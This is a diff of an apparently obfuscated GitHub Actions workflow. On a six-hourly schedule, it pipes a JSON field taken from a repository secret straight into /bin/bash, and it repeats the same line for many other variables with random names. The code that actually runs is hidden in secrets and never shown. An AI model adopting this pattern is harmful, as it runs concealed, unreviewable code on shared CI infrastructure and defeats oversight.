@@ -1,9 +1,11 @@
 name: zengwutuan1234
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 0/6 * * *'
-jobs:  # 19182
+    - cron: '8 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,13 +13,17 @@ jobs:  # 19182
       - uses: actions/checkout@v4
       - name: zengwutuan1234
         env:
-          ka1: ${{ secrets.ka1 }}
+          pkul52914: ${{ secrets.pkul52914 }}
         run: |
-          echo $ka1 | jq -r .mgd15919 | /bin/bash
-          echo $jemvc9 | jq -r .le2649 | /bin/bash
-          echo $iiv48347 | jq -r .vavo4483 | /bin/bash
-          echo $nce34627 | jq -r .auuo171 | /bin/bash
-          echo $dvefx6757 | jq -r .rn680 | /bin/bash
-          echo $yj4 | jq -r .rkfwk25282 | /bin/bash
-          echo $rq4 | jq -r .baoiy5098 | /bin/bash
+          echo $pkul52914 | jq -r .eadpm36919 | /bin/bash
+          echo $cvs80 | jq -r .uaoaq012 | /bin/bash
+          echo $htkp50754 | jq -r .foocn31756 | /bin/bash
+          echo $i96139 | jq -r .fbss493 | /bin/bash
+          echo $uh88 | jq -r .wa3979 | /bin/bash
+          echo $jybls30345 | jq -r .rqg116 | /bin/bash
+          echo $f38295 | jq -r .osli6 | /bin/bash
+          echo $tzem3 | jq -r .zhyl84 | /bin/bash
+          echo $klplf3069 | jq -r .nwu4904 | /bin/bash
+          echo $ljysl84348 | jq -r .rcml9282 | /bin/bash
+          echo $ieu0886 | jq -r .ephc8913 | /bin/bash
 
